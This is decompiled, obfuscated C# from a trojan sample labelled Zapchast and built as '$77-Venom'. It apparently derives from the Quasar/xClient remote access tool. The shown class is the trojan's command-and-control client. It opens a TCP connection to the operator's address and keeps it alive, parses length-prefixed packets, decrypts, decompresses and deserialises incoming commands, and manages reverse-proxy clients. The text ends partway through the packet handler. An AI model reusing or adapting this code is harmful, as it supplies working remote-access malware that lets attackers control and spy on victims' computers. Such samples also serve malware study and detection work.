// Decompiled with JetBrains decompiler
// Type: 㺏⢯耲狪壨郾㺍Ὁ᧑疘ꕲ㥛兂霜溹઒೦
// Assembly: $77-Venom, Version=2.1.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DC8E8704-647D-4CA7-99AB-BB7BE936B486
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.02-msil\HEUR-Trojan.MSIL.Zapchast.gen-2e1eda10e2bbd19418706a23888807e50c0407eb191cc26d541c85279193c3db.exe

using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using xClient.Core.NetSerializer;
using xClient.Core.ReverseProxy.Packets;
using xClient.Core.Utilities;

public class 㺏\u28AF耲狪壨\uF626郾㺍\uF82EὉ᧑疘ꕲ㥛兂\uF5F7霜溹\u0A92೦
{
  private Socket 婘홢\uFDEE겠䔝巌졷玿먽靫ꝝ弪ᅙ逡\u2872\u22CD왑ͽ棷Ϝ;
  private List<\uEBF9\u2BE9Ⴒ鮡䈄\uED9B퉥䑎꼬春쒦諺똻ﻤ\u28D5償\uEED7\uFFFD홙\uFFFD> \uF5A3\u27B2\uFFFD䪈䢖꽁罻ښ莉밈廰眩籠鞿룜㗫\uE748ꁱ\uF201Ꭳ;
  private readonly object 䥒蝠ᤊ鼗\uFFFD䶠瓘￹\u3246\u2975\u3012볥뺥鯃\uF067쀿䄗鄀䖞ⷠ = new object();
  private byte[] \uFFFD癸\uE48A\uE229䴊藌뷩䟓\u20CD\uFFFD\u2B3E㐃弫\uEC3F隬\u28C7膄㟠湟廐;
  private byte[] 퍉㦡\u20AD䋦㶱\u1FDFค夑\uED2Cᜮ\uEC61쐍뷥膷彆䈢\uEF57个靄淯;
  private readonly Queue<byte[]> \uFFFD䋩鰬쥕뷺䫽쥄㐖\uE893\uEE69懐ﹿ\u32C2ⳗ껕\u33F9\uEDFB뢮匴諾 = new Queue<byte[]>();
  private bool 좯疒玛\uF53B\u2789䭘\uF3CB\u2231\uFFFD魬䂅莻掾깉뀶샻䕓ḯ\u299C紐;
  private readonly object 翝纃Җ\u082F\uEA46鎜赟ᩗ\uE629\u1AAB怡鬱ౌ翏㰁嬛\uFFFD\uFFEE㠙ꖱ = new object();
  private readonly Queue<byte[]> 赫會᱕\uE8B2騞\uEE23楽껲퓢駕\uEF9B蔿斮\uE5A5枰䞶䈋쨨낱ॐ = new Queue<byte[]>();
  private bool 皚\uE0CC峠捋抛桩㩛\uFFFD\u4DFBथᅞ\uF45A\uF11F嘴瞓\u2B6D䱐坊矧ჱ;
  private readonly object \uFFFD쩰䚶붲祕짅\uED44ዸ磞笉\u281D핀ಢ碍睥櫞蟌\uFFFDͨ벹 = new object();
  private byte[] 蠷\uF2C8\uE990㒲뗐畸ꠅ\u256D\uE894ס묥洧\uFFFD峻靏搶斕ꢏ떜薪;
  private bool 鳜᳕䂙虫\uF0DF垊ᶞ̆꼔躀鳘۱걘ꯆ귴묖茬屶燣䔚;
  private int \uFFFD鳒쒪\u1CAF쨣掋\u2732냨泶\uFFFD涆綩᪑惂뺋\u2668\uFFFD箎摂毙;
  private int 쀙挔磀巺㦋湅鼪ଋ夕\u29BE踳\u255F箈ӳ\uE3EB轢\uFFFD촿쐢\u2749;
  private int ዋ\uF1CC蟊擟㞏홛粥腭媻ꥬ\uFFFD廽굷澧땵嶽匞獭늄䙻;
  private int 䚁콂滛棺Ꮊ擝ꊶ垩ⶔ\u2FB7䦛㱦蔫ﹺ貼쨇\u20A3齾氛뚕;
  private int \uFAFEԲ烧\uA4A7鵉ｅ鵉膞먁羃ᯋ\uFFFD\uF58B偞睊ꮼहᰓ쀤䠕;
  private 㺏\u28AF耲狪壨\uF626郾㺍\uF82EὉ᧑疘ꕲ㥛兂\uF5F7霜溹\u0A92೦.珞港ꦽ\u0A57瘫㷺蠙㮈뒶艵讁\u283A\u252E\u2AA3矶\uEF75㔿\uA4B6얗黴 쥿餏얝ṻ\u2A16\u27D9\uFFFD똳瘍캒倣\u25B9꼘ꡧ婦揲㒎큱\u2EC8畯;
  private const bool \uFFFD䗼檃ꓭ䁗\u02ED闓᪷嶩シ\uEFC8垎ご쨈䙶䗎轇\u3322\uEC62ꗤ = true;
  private const bool 齻㒋㒁ŷﺉ㧫肃\uF77F䩿ᵛ銌寐ڙ凌騈Ӭ\u2921㠉\uEF21詂 = true;

  public event 㺏\u28AF耲狪壨\uF626郾㺍\uF82EὉ᧑疘ꕲ㥛兂\uF5F7霜溹\u0A92೦.즣噟엕\u2385ꐩ쐦\u243F䭁餒\u087E㹑ధꄨ놛苕묐읛\uFFFDພ獮 荪㒻Ⲗ䱶ӪⰓ鎑挏儋\uEFFC䋭ꧯꓡ뻕\uE4D6Ӫ瀠ⱀ럡\u4DCB;

  private void 죌\uE33D酉㿵虀\u32D1ရ\u227F떨맺躅\uEE14ﭓﭐ肄篏㧟\uEDDB笫\uE04C(Exception ex)
  {
    // ISSUE: reference to a compiler-generated field
    㺏\u28AF耲狪壨\uF626郾㺍\uF82EὉ᧑疘ꕲ㥛兂\uF5F7霜溹\u0A92೦.즣噟엕\u2385ꐩ쐦\u243F䭁餒\u087E㹑ధꄨ놛苕묐읛\uFFFDພ獮 㲓㢃汉퐭眫ᜊ勒䛙ᇲ穣埬瘎죠妋끻흫䯲 = this.顗\u02EB㲓㢃汉퐭眫ᜊ勒䛙ᇲ穣埬\uF367瘎죠妋끻흫䯲;
    if (㲓㢃汉퐭眫ᜊ勒䛙ᇲ穣埬瘎죠妋끻흫䯲 == null)
      return;
    㲓㢃汉퐭眫ᜊ勒䛙ᇲ穣埬瘎죠妋끻흫䯲(this, ex);
  }

  public event 㺏\u28AF耲狪壨\uF626郾㺍\uF82EὉ᧑疘ꕲ㥛兂\uF5F7霜溹\u0A92೦.坊緸ᔢꌙ६ﲳ㲪疡軀앓쯴賮塙텆ᩜ\uE00D셚羞鮔륌 慕躈鯇\uF302\u2E00褎䖹脻䰓먁ꖊ诶ဥ懫\uFFFD凔擽誯֟ꤰ;

  private void 湦筇圔\uFD41掴嬧죮ꨫ胛\uE08C鯝\uE46Cଽ갧毫७ᣳ\u221E\uEBAF\uE225(bool connected)
  {
    if (this.Connected == connected)
      return;
    this.Connected = connected;
    // ISSUE: reference to a compiler-generated field
    㺏\u28AF耲狪壨\uF626郾㺍\uF82EὉ᧑疘ꕲ㥛兂\uF5F7霜溹\u0A92೦.坊緸ᔢꌙ६ﲳ㲪疡軀앓쯴賮塙텆ᩜ\uE00D셚羞鮔륌 駨̈伷김舲竚ࣦ䇔깣윎䋙潄竢撪蹵 = this.駨\uEC60̈伷김舲竚ࣦ䇔\uFFFD깣\uEAEB\uE140윎䋙\uF1EE潄竢撪蹵;
    if (駨̈伷김舲竚ࣦ䇔깣윎䋙潄竢撪蹵 == null)
      return;
    駨̈伷김舲竚ࣦ䇔깣윎䋙潄竢撪蹵(this, connected);
  }

  public event 㺏\u28AF耲狪壨\uF626郾㺍\uF82EὉ᧑疘ꕲ㥛兂\uF5F7霜溹\u0A92೦.\u1DF1駲\uF0AE᳦\uF2AF胿\u23F3뺂妞䣜诲ಆ\uF47Dૢ읹䞮돍ᩎ㡦삧 斁幤྄\u2BB6\uE4BFꘐ\uE7A0\u2EC8ᵎ㓼\u00B9뽼\uF431\u19EF\uE97E樿氙㾍죌\uFFFD;

  private void 뗁ﺺ퓸虉\u220B잜\u21DD㺯\uE89C\u1C4Bǭᒺ慮堫慸Ἓ\u0FFF뇛떣嫯(
    쾭匟卥쌆\uFFFD읂蘾\u3222Ｌ耈\u2D73ウ\uE00C늣飻皨ߖ빕衆뤽 packet)
  {
    // ISSUE: reference to a compiler-generated field
    㺏\u28AF耲狪壨\uF626郾㺍\uF82EὉ᧑疘ꕲ㥛兂\uF5F7霜溹\u0A92೦.\u1DF1駲\uF0AE᳦\uF2AF胿\u23F3뺂妞䣜诲ಆ\uF47Dૢ읹䞮돍ᩎ㡦삧 䤛ꁟఎ茯蜊樹ꆃ危꾨㵿똙鑢놱鬰朾༡磠ﷃ = this.䤛ꁟఎ茯蜊樹ꆃ\uF151危꾨㵿\uE5B9똙鑢놱鬰朾༡磠ﷃ;
    if (䤛ꁟఎ茯蜊樹ꆃ危꾨㵿똙鑢놱鬰朾༡磠ﷃ == null)
      return;
    䤛ꁟఎ茯蜊樹ꆃ危꾨㵿똙鑢놱鬰朾༡磠ﷃ(this, packet);
  }

  public event 㺏\u28AF耲狪壨\uF626郾㺍\uF82EὉ᧑疘ꕲ㥛兂\uF5F7霜溹\u0A92೦.讗\uEA31풚\uF59B鉋鰴ꑣ硇鎑ꤒ軖꽋婱ٳ췕姿这셋둞퇸 \uE6C3䤉\uEFAC긶\u0B53䵗駨ᇬ\uE39B诖櫣쏥㒶鼕\uE547ᗿ흓㥅\uF74B\uE49F;

  private void 쐖錦䤩厔\uFFFD\uF456\u21CF跊\uFFFD跷쬁圹Ԍ\uFFFD쌢㝮跗쵨鴲균(
    쾭匟卥쌆\uFFFD읂蘾\u3222Ｌ耈\u2D73ウ\uE00C늣飻皨ߖ빕衆뤽 packet,
    long length,
    byte[] rawData)
  {
    // ISSUE: reference to a compiler-generated field
    㺏\u28AF耲狪壨\uF626郾㺍\uF82EὉ᧑疘ꕲ㥛兂\uF5F7霜溹\u0A92೦.讗\uEA31풚\uF59B鉋鰴ꑣ硇鎑ꤒ軖꽋婱ٳ췕姿这셋둞퇸 겢륹䠑䋏瓎퐣罹勢꺞䙽낗죝з令Ͱ펹 = this.겢륹䠑\u21BA䋏瓎퐣\uEAB0罹勢꺞䙽낗죝з令\uF5C6\u2907Ͱ펹;
    if (겢륹䠑䋏瓎퐣罹勢꺞䙽낗죝з令Ͱ펹 == null)
      return;
    겢륹䠑䋏瓎퐣罹勢꺞䙽낗죝з令Ͱ펹(this, packet, length, rawData);
  }

  public int BUFFER_SIZE => 16384;

  public uint KEEP_ALIVE_TIME => 25000;

  public uint KEEP_ALIVE_INTERVAL => 25000;

  public int HEADER_SIZE => 4;

  public int MAX_PACKET_SIZE => 5242880;

  public \uEBF9\u2BE9Ⴒ鮡䈄\uED9B퉥䑎꼬春쒦諺똻ﻤ\u28D5償\uEED7\uFFFD홙\uFFFD[] ProxyClients
  {
    get
    {
      lock (this.䥒蝠ᤊ鼗\uFFFD䶠瓘￹\u3246\u2975\u3012볥뺥鯃\uF067쀿䄗鄀䖞ⷠ)
        return this.\uF5A3\u27B2\uFFFD䪈䢖꽁罻ښ莉밈廰眩籠鞿룜㗫\uE748ꁱ\uF201Ꭳ.ToArray();
    }
  }

  public bool Connected { get; private set; }

  protected Serializer Serializer { get; set; }

  protected 㺏\u28AF耲狪壨\uF626郾㺍\uF82EὉ᧑疘ꕲ㥛兂\uF5F7霜溹\u0A92೦()
  {
    this.\uF5A3\u27B2\uFFFD䪈䢖꽁罻ښ莉밈廰眩籠鞿룜㗫\uE748ꁱ\uF201Ꭳ = new List<\uEBF9\u2BE9Ⴒ鮡䈄\uED9B퉥䑎꼬春쒦諺똻ﻤ\u28D5償\uEED7\uFFFD홙\uFFFD>();
    this.\uFFFD癸\uE48A\uE229䴊藌뷩䟓\u20CD\uFFFD\u2B3E㐃弫\uEC3F隬\u28C7膄㟠湟廐 = new byte[this.BUFFER_SIZE];
    this.蠷\uF2C8\uE990㒲뗐畸ꠅ\u256D\uE894ס묥洧\uFFFD峻靏搶斕ꢏ떜薪 = new byte[this.HEADER_SIZE];
  }

  protected void \u09FC賂ᴈ튆ﳇꫛ\u0EC5㜷\u0CFD캱쏎ᄢ戞榛榵ᗑ䉗熰\u4DCE\uFFFD(IPAddress ip, ushort port)
  {
    try
    {
      this.\u0607碧\uFFFDꓞ䣉թ쟟蜳쁎䜗쿿뀭僷傈䠁\u21FFⷛ钝⃗䒴();
      this.婘홢\uFDEE겠䔝巌졷玿먽靫ꝝ弪ᅙ逡\u2872\u22CD왑ͽ棷Ϝ = new Socket(ip.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
      this.婘홢\uFDEE겠䔝巌졷玿먽靫ꝝ弪ᅙ逡\u2872\u22CD왑ͽ棷Ϝ.SetKeepAliveEx(this.KEEP_ALIVE_INTERVAL, this.KEEP_ALIVE_TIME);
      this.婘홢\uFDEE겠䔝巌졷玿먽靫ꝝ弪ᅙ逡\u2872\u22CD왑ͽ棷Ϝ.Connect(ip, (int) port);
      if (!this.婘홢\uFDEE겠䔝巌졷玿먽靫ꝝ弪ᅙ逡\u2872\u22CD왑ͽ棷Ϝ.Connected)
        return;
      this.婘홢\uFDEE겠䔝巌졷玿먽靫ꝝ弪ᅙ逡\u2872\u22CD왑ͽ棷Ϝ.BeginReceive(this.\uFFFD癸\uE48A\uE229䴊藌뷩䟓\u20CD\uFFFD\u2B3E㐃弫\uEC3F隬\u28C7膄㟠湟廐, 0, this.\uFFFD癸\uE48A\uE229䴊藌뷩䟓\u20CD\uFFFD\u2B3E㐃弫\uEC3F隬\u28C7膄㟠湟廐.Length, SocketFlags.None, new AsyncCallback(this.䦵\uF116輻쵗暴麋㘄둧鐊ͮ粴喇ꆐ︩ꑴᢨ䮇\uF30A춌搯), (object) null);
      this.湦筇圔\uFD41掴嬧죮ꨫ胛\uE08C鯝\uE46Cଽ갧毫७ᣳ\u221E\uEBAF\uE225(true);
    }
    catch (Exception ex)
    {
      this.죌\uE33D酉㿵虀\u32D1ရ\u227F떨맺躅\uEE14ﭓﭐ肄篏㧟\uEDDB笫\uE04C(ex);
    }
  }

  private void 䦵\uF116輻쵗暴麋㘄둧鐊ͮ粴喇ꆐ︩ꑴᢨ䮇\uF30A춌搯(IAsyncResult result)
  {
    int length;
    try
    {
      length = this.婘홢\uFDEE겠䔝巌졷玿먽靫ꝝ弪ᅙ逡\u2872\u22CD왑ͽ棷Ϝ.EndReceive(result);
      if (length <= 0)
        throw new Exception("no bytes transferred");
    }
    catch (NullReferenceException ex)
    {
      return;
    }
    catch (ObjectDisposedException ex)
    {
      return;
    }
    catch (Exception ex)
    {
      this.\u0607碧\uFFFDꓞ䣉թ쟟蜳쁎䜗쿿뀭僷傈䠁\u21FFⷛ钝⃗䒴();
      return;
    }
    byte[] destinationArray = new byte[length];
    try
    {
      Array.Copy((Array) this.\uFFFD癸\uE48A\uE229䴊藌뷩䟓\u20CD\uFFFD\u2B3E㐃弫\uEC3F隬\u28C7膄㟠湟廐, (Array) destinationArray, destinationArray.Length);
    }
    catch (Exception ex)
    {
      this.죌\uE33D酉㿵虀\u32D1ရ\u227F떨맺躅\uEE14ﭓﭐ肄篏㧟\uEDDB笫\uE04C(ex);
      return;
    }
    lock (this.赫會᱕\uE8B2騞\uEE23楽껲퓢駕\uEF9B蔿斮\uE5A5枰䞶䈋쨨낱ॐ)
      this.赫會᱕\uE8B2騞\uEE23楽껲퓢駕\uEF9B蔿斮\uE5A5枰䞶䈋쨨낱ॐ.Enqueue(destinationArray);
    lock (this.\uFFFD쩰䚶붲祕짅\uED44ዸ磞笉\u281D핀ಢ碍睥櫞蟌\uFFFDͨ벹)
    {
      if (!this.皚\uE0CC峠捋抛桩㩛\uFFFD\u4DFBथᅞ\uF45A\uF11F嘴瞓\u2B6D䱐坊矧ჱ)
      {
        this.皚\uE0CC峠捋抛桩㩛\uFFFD\u4DFBथᅞ\uF45A\uF11F嘴瞓\u2B6D䱐坊矧ჱ = true;
        ThreadPool.QueueUserWorkItem(new WaitCallback(this.噄䰺৫쿆忤㳸䡲䀵\u2EA3\u1C83ᔤㄲ㻀㽠\uF808쌁ߤ\u2CE6씦ﱞ));
      }
    }
    try
    {
      this.婘홢\uFDEE겠䔝巌졷玿먽靫ꝝ弪ᅙ逡\u2872\u22CD왑ͽ棷Ϝ.BeginReceive(this.\uFFFD癸\uE48A\uE229䴊藌뷩䟓\u20CD\uFFFD\u2B3E㐃弫\uEC3F隬\u28C7膄㟠湟廐, 0, this.\uFFFD癸\uE48A\uE229䴊藌뷩䟓\u20CD\uFFFD\u2B3E㐃弫\uEC3F隬\u28C7膄㟠湟廐.Length, SocketFlags.None, new AsyncCallback(this.䦵\uF116輻쵗暴麋㘄둧鐊ͮ粴喇ꆐ︩ꑴᢨ䮇\uF30A춌搯), (object) null);
    }
    catch (ObjectDisposedException ex)
    {
    }
    catch (Exception ex)
    {
      this.죌\uE33D酉㿵虀\u32D1ရ\u227F떨맺躅\uEE14ﭓﭐ肄篏㧟\uEDDB笫\uE04C(ex);
    }
  }

  private void 噄䰺৫쿆忤㳸䡲䀵\u2EA3\u1C83ᔤㄲ㻀㽠\uF808쌁ߤ\u2CE6씦ﱞ(object state)
  {
    while (true)
    {
      byte[] sourceArray;
      lock (this.赫會᱕\uE8B2騞\uEE23楽껲퓢駕\uEF9B蔿斮\uE5A5枰䞶䈋쨨낱ॐ)
      {
        if (this.赫會᱕\uE8B2騞\uEE23楽껲퓢駕\uEF9B蔿斮\uE5A5枰䞶䈋쨨낱ॐ.Count == 0)
        {
          lock (this.\uFFFD쩰䚶붲祕짅\uED44ዸ磞笉\u281D핀ಢ碍睥櫞蟌\uFFFDͨ벹)
          {
            this.皚\uE0CC峠捋抛桩㩛\uFFFD\u4DFBथᅞ\uF45A\uF11F嘴瞓\u2B6D䱐坊矧ჱ = false;
            break;
          }
        }
        else
          sourceArray = this.赫會᱕\uE8B2騞\uEE23楽껲퓢駕\uEF9B蔿斮\uE5A5枰䞶䈋쨨낱ॐ.Dequeue();
      }
      this.䚁콂滛棺Ꮊ擝ꊶ垩ⶔ\u2FB7䦛㱦蔫ﹺ貼쨇\u20A3齾氛뚕 += sourceArray.Length;
      bool flag1 = true;
      while (flag1)
      {
        switch (this.쥿餏얝ṻ\u2A16\u27D9\uFFFD똳瘍캒倣\u25B9꼘ꡧ婦揲㒎큱\u2EC8畯)
        {
          case 㺏\u28AF耲狪壨\uF626郾㺍\uF82EὉ᧑疘ꕲ㥛兂\uF5F7霜溹\u0A92೦.珞港ꦽ\u0A57瘫㷺蠙㮈뒶艵讁\u283A\u252E\u2AA3矶\uEF75㔿\uA4B6얗黴.\u064E쑏\uFFFD㨃楃解襒㷧퇂\u248C獠㫜\u257F\uE561쳛灳뉼䘽䠭\u3391:
            if (this.䚁콂滛棺Ꮊ擝ꊶ垩ⶔ\u2FB7䦛㱦蔫ﹺ貼쨇\u20A3齾氛뚕 + this.ዋ\uF1CC蟊擟㞏홛粥腭媻ꥬ\uFFFD廽굷澧땵嶽匞獭늄䙻 >= this.HEADER_SIZE)
            {
              int length = this.鳜᳕䂙虫\uF0DF垊ᶞ̆꼔躀鳘۱걘ꯆ귴묖茬屶燣䔚 ? this.HEADER_SIZE - this.ዋ\uF1CC蟊擟㞏홛粥腭媻ꥬ\uFFFD廽굷澧땵嶽匞獭늄䙻 : this.HEADER_SIZE;
              try
              {
                if (this.鳜᳕䂙虫\uF0DF垊ᶞ̆꼔躀鳘۱걘ꯆ귴묖茬屶燣䔚)
                {
                  try
                  {
                    Array.Copy((Array) sourceArray, this.\uFFFD鳒쒪\u1CAF쨣掋\u2732냨泶\uFFFD涆綩᪑惂뺋\u2668\uFFFD箎摂毙, (Array) this.蠷\uF2C8\uE990㒲뗐畸ꠅ\u256D\uE894ס묥洧\uFFFD峻靏搶斕ꢏ떜薪, this.ዋ\uF1CC蟊擟㞏홛粥腭媻ꥬ\uFFFD廽굷澧땵嶽匞獭늄䙻, length);
                  }
                  catch (Exception ex)
                  {
                    flag1 = false;
                    this.죌\uE33D酉㿵虀\u32D1ရ\u227F떨맺躅\uEE14ﭓﭐ肄篏㧟\uEDDB笫\uE04C(ex);
                    continue;
                  }
                  this.\uFAFEԲ烧\uA4A7鵉ｅ鵉膞먁羃ᯋ\uFFFD\uF58B偞睊ꮼहᰓ쀤䠕 = BitConverter.ToInt32(this.蠷\uF2C8\uE990㒲뗐畸ꠅ\u256D\uE894ס묥洧\uFFFD峻靏搶斕ꢏ떜薪, 0);
                  this.ዋ\uF1CC蟊擟㞏홛粥腭媻ꥬ\uFFFD廽굷澧땵嶽匞獭늄䙻 = 0;
                  this.鳜᳕䂙虫\uF0DF垊ᶞ̆꼔躀鳘۱걘ꯆ귴묖茬屶燣䔚 = false;
                }
                else
                  this.\uFAFEԲ烧\uA4A7鵉ｅ鵉膞먁羃ᯋ\uFFFD\uF58B偞睊ꮼहᰓ쀤䠕 = BitConverter.ToInt32(sourceArray, this.\uFFFD鳒쒪\u1CAF쨣掋\u2732냨泶\uFFFD涆綩᪑惂뺋\u2668\uFFFD箎摂毙);
                if (this.\uFAFEԲ烧\uA4A7鵉ｅ鵉膞먁羃ᯋ\uFFFD\uF58B偞睊ꮼहᰓ쀤䠕 > 0)
                {
                  if (this.\uFAFEԲ烧\uA4A7鵉ｅ鵉膞먁羃ᯋ\uFFFD\uF58B偞睊ꮼहᰓ쀤䠕 <= this.MAX_PACKET_SIZE)
                    goto label_24;
                }
                throw new Exception("invalid header");
              }
              catch (Exception ex)
              {
                flag1 = false;
                this.\u0607碧\uFFFDꓞ䣉թ쟟蜳쁎䜗쿿뀭僷傈䠁\u21FFⷛ钝⃗䒴();
                continue;
              }
label_24:
              this.䚁콂滛棺Ꮊ擝ꊶ垩ⶔ\u2FB7䦛㱦蔫ﹺ貼쨇\u20A3齾氛뚕 -= length;
              this.\uFFFD鳒쒪\u1CAF쨣掋\u2732냨泶\uFFFD涆綩᪑惂뺋\u2668\uFFFD箎摂毙 += length;
              this.쥿餏얝ṻ\u2A16\u27D9\uFFFD똳瘍캒倣\u25B9꼘ꡧ婦揲㒎큱\u2EC8畯 = 㺏\u28AF耲狪壨\uF626郾㺍\uF82EὉ᧑疘ꕲ㥛兂\uF5F7霜溹\u0A92೦.珞港ꦽ\u0A57瘫㷺蠙㮈뒶艵讁\u283A\u252E\u2AA3矶\uEF75㔿\uA4B6얗黴.\uE76F懑ᛒ\uF491渏얕ᷩ孒㨄晬Ꮩ訴\uFFFD\uE260ꍑꖆه큄㖜囘;
              continue;
            }
            try
            {
              Array.Copy((Array) sourceArray, this.\uFFFD鳒쒪\u1CAF쨣掋\u2732냨泶\uFFFD涆綩᪑惂뺋\u2668\uFFFD箎摂毙, (Array) this.蠷\uF2C8\uE990㒲뗐畸ꠅ\u256D\uE894ס묥洧\uFFFD峻靏搶斕ꢏ떜薪, this.ዋ\uF1CC蟊擟㞏홛粥腭媻ꥬ\uFFFD廽굷澧땵嶽匞獭늄䙻, this.䚁콂滛棺Ꮊ擝ꊶ垩ⶔ\u2FB7䦛㱦蔫ﹺ貼쨇\u20A3齾氛뚕);
            }
            catch (Exception ex)
            {
              flag1 = false;
              this.죌\uE33D酉㿵虀\u32D1ရ\u227F떨맺躅\uEE14ﭓﭐ肄篏㧟\uEDDB笫\uE04C(ex);
              continue;
            }
            this.ዋ\uF1CC蟊擟㞏홛粥腭媻ꥬ\uFFFD廽굷澧땵嶽匞獭늄䙻 += this.䚁콂滛棺Ꮊ擝ꊶ垩ⶔ\u2FB7䦛㱦蔫ﹺ貼쨇\u20A3齾氛뚕;
            this.鳜᳕䂙虫\uF0DF垊ᶞ̆꼔躀鳘۱걘ꯆ귴묖茬屶燣䔚 = true;
            flag1 = false;
            continue;
          case 㺏\u28AF耲狪壨\uF626郾㺍\uF82EὉ᧑疘ꕲ㥛兂\uF5F7霜溹\u0A92೦.珞港ꦽ\u0A57瘫㷺蠙㮈뒶艵讁\u283A\u252E\u2AA3矶\uEF75㔿\uA4B6얗黴.\uE76F懑ᛒ\uF491渏얕ᷩ孒㨄晬Ꮩ訴\uFFFD\uE260ꍑꖆه큄㖜囘:
            if (this.퍉㦡\u20AD䋦㶱\u1FDFค夑\uED2Cᜮ\uEC61쐍뷥膷彆䈢\uEF57个靄淯 == null || this.퍉㦡\u20AD䋦㶱\u1FDFค夑\uED2Cᜮ\uEC61쐍뷥膷彆䈢\uEF57个靄淯.Length != this.\uFAFEԲ烧\uA4A7鵉ｅ鵉膞먁羃ᯋ\uFFFD\uF58B偞睊ꮼहᰓ쀤䠕)
              this.퍉㦡\u20AD䋦㶱\u1FDFค夑\uED2Cᜮ\uEC61쐍뷥膷彆䈢\uEF57个靄淯 = new byte[this.\uFAFEԲ烧\uA4A7鵉ｅ鵉膞먁羃ᯋ\uFFFD\uF58B偞睊ꮼहᰓ쀤䠕];
            int length1 = this.쀙挔磀巺㦋湅鼪ଋ夕\u29BE踳\u255F箈ӳ\uE3EB轢\uFFFD촿쐢\u2749 + this.䚁콂滛棺Ꮊ擝ꊶ垩ⶔ\u2FB7䦛㱦蔫ﹺ貼쨇\u20A3齾氛뚕 >= this.\uFAFEԲ烧\uA4A7鵉ｅ鵉膞먁羃ᯋ\uFFFD\uF58B偞睊ꮼहᰓ쀤䠕 ? this.\uFAFEԲ烧\uA4A7鵉ｅ鵉膞먁羃ᯋ\uFFFD\uF58B偞睊ꮼहᰓ쀤䠕 - this.쀙挔磀巺㦋湅鼪ଋ夕\u29BE踳\u255F箈ӳ\uE3EB轢\uFFFD촿쐢\u2749 : this.䚁콂滛棺Ꮊ擝ꊶ垩ⶔ\u2FB7䦛㱦蔫ﹺ貼쨇\u20A3齾氛뚕;
            try
            {
              Array.Copy((Array) sourceArray, this.\uFFFD鳒쒪\u1CAF쨣掋\u2732냨泶\uFFFD涆綩᪑惂뺋\u2668\uFFFD箎摂毙, (Array) this.퍉㦡\u20AD䋦㶱\u1FDFค夑\uED2Cᜮ\uEC61쐍뷥膷彆䈢\uEF57个靄淯, this.쀙挔磀巺㦋湅鼪ଋ夕\u29BE踳\u255F箈ӳ\uE3EB轢\uFFFD촿쐢\u2749, length1);
            }
            catch (Exception ex)
            {
              flag1 = false;
              this.죌\uE33D酉㿵虀\u32D1ရ\u227F떨맺躅\uEE14ﭓﭐ肄篏㧟\uEDDB笫\uE04C(ex);
              continue;
            }
            this.쀙挔磀巺㦋湅鼪ଋ夕\u29BE踳\u255F箈ӳ\uE3EB轢\uFFFD촿쐢\u2749 += length1;
            this.\uFFFD鳒쒪\u1CAF쨣掋\u2732냨泶\uFFFD涆綩᪑惂뺋\u2668\uFFFD箎摂毙 += length1;
            this.䚁콂滛棺Ꮊ擝ꊶ垩ⶔ\u2FB7䦛㱦蔫ﹺ貼쨇\u20A3齾氛뚕 -= length1;
            if (this.쀙挔磀巺㦋湅鼪ଋ夕\u29BE踳\u255F箈ӳ\uE3EB轢\uFFFD촿쐢\u2749 == this.\uFAFEԲ烧\uA4A7鵉ｅ鵉膞먁羃ᯋ\uFFFD\uF58B偞睊ꮼहᰓ쀤䠕)
            {
              bool flag2 = this.퍉㦡\u20AD䋦㶱\u1FDFค夑\uED2Cᜮ\uEC61쐍뷥膷彆䈢\uEF57个靄淯.Length == 0;
              if (!flag2)
              {
                this.퍉㦡\u20AD䋦㶱\u1FDFค夑\uED2Cᜮ\uEC61쐍뷥膷彆䈢\uEF57个靄淯 = 湝增ﭞ嵇ʧ\uF2CD\uFFFD뜚罡ꈱ\u2B63\u2011퐖珎\u1CAD胂\uEF70ต댩\uEB37.憲\uF525イ귉鏴䖹좍࿆제廰揆頻Ἳ棝᭫혍첀\uFFFD떣未(this.퍉㦡\u20AD䋦㶱\u1FDFค夑\uED2Cᜮ\uEC61쐍뷥膷彆䈢\uEF57个靄淯);
                flag2 = this.퍉㦡\u20AD䋦㶱\u1FDFค夑\uED2Cᜮ\uEC61쐍뷥膷彆䈢\uEF57个靄淯.Length == 0;
              }
              if (!flag2)
              {
                try
                {
                  this.퍉㦡\u20AD䋦㶱\u1FDFค夑\uED2Cᜮ\uEC61쐍뷥膷彆䈢\uEF57个靄淯 = 싾蜇ᤣ汦\uF694\u27D9훊\u2726䲡ῠ㳚\uFFFD줩ੂ芎ᶎ䅹罵\uE26F壑.禕\uFFFD\uFFFD䄗鷁纅揚\u2620\uFFF0䳏\uE6DB醥槊ꈷ倊㝮갖㣴狟퇬(this.퍉㦡\u20AD䋦㶱\u1FDFค夑\uED2Cᜮ\uEC61쐍뷥膷彆䈢\uEF57个靄淯);
                }
                catch (Exception ex)
                {
                  flag1 = false;
                  this.\u0607碧\uFFFDꓞ䣉թ쟟蜳쁎䜗쿿뀭僷傈䠁\u21FFⷛ钝⃗䒴();
                  continue;
                }
                flag2 = this.퍉㦡\u20AD䋦㶱\u1FDFค夑\uED2Cᜮ\uEC61쐍뷥膷彆䈢\uEF57个靄淯.Length == 0;
              }
              if (flag2)
              {
                flag1 = false;
                this.\u0607碧\uFFFDꓞ䣉թ쟟蜳쁎䜗쿿뀭僷傈䠁\u21FFⷛ钝⃗䒴();
                continue;
              }
              using (MemoryStream memoryStream = new MemoryStream(this.퍉㦡\u20AD䋦㶱\u1FDFค夑\uED2Cᜮ\uEC61쐍뷥膷彆䈢\uEF57个靄淯))
              {
                try
                {
                  this.뗁ﺺ퓸虉\u220B잜\u21DD㺯\uE89C\u1C4Bǭᒺ慮堫慸Ἓ\u0FFF뇛떣嫯((쾭匟卥쌆\uFFFD읂蘾\u3222Ｌ耈\u2D73ウ\uE00C늣飻皨ߖ빕衆뤽) this.Serializer.Deserialize((Stream) memoryStream));
                }
                catch (Exception ex)
                {
                  flag1 = false;
                  this.죌\uE33D酉㿵虀\u32D1ရ\u227F떨맺躅\uEE14ﭓﭐ肄篏㧟\uEDDB笫\uE04C(ex);
                  continue;
                }
              }
